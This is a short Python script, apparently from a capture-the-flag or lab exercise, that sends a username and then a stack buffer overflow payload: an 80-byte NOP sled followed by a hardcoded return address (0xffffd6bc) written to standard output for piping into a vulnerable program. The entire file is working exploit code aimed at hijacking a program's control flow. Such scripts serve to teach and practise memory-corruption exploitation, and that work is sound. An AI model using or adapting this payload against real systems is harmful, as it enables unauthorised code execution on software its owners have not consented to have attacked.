import sys, time

user = "dat_wil" + "\n"

nops = "\x90" * 80

addr_start_buff = "\xbc\xd6\xff\xff" #0xffffd6bc

payload = nops + addr_start_buff


sys.stdout.write(user)
sys.stdout.flush()
time.sleep(0.2)
sys.stdout.write(payload)
sys.stdout.flush()